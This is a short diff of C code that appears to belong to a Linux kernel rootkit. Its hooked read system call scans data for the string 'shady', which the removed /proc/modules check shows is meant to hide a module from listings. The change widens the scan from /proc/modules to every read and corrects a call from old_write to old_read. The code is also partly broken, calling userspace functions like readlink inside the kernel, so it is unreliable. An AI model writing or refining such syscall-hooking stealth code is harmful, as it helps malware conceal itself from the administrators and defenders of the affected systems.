@@ -90,17 +90,17 @@ asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
 
 asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
 {
-     char nameBuffer[13];
-     char* filename = "/proc/modules";
+     //char nameBuffer[13];
+     //char* filename = "/proc/modules";
      int i;
      int searchIndex = 0;
      int searchLength = 5;
      char searchText[] = "shady";
-     char readlinkPath[PATH_MAX];
-     sprintf(&readlinkPath, "/proc/self/fd/%d", fd);
-     readlink(readlinkPath, nameBuffer, 13);
-     if(!strcmp(filename, nameBuffer))
-     {
+     //char readlinkPath[PATH_MAX];
+     //sprintf(&readlinkPath, "/proc/self/fd/%d", fd);
+     //readlink(readlinkPath, nameBuffer, 13);
+     /*if(!strcmp(filename, nameBuffer))
+     {*/
           for(i=0; i<count; i++)
           {
                if(((char*)buf)[i]==searchText[searchIndex])
@@ -116,8 +116,8 @@ asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
                     searchIndex=0;
                }
           }
-     }
-     return old_write(fd, buf, count);
+     //}
+     return old_read(fd, buf, count);
 }
 
 
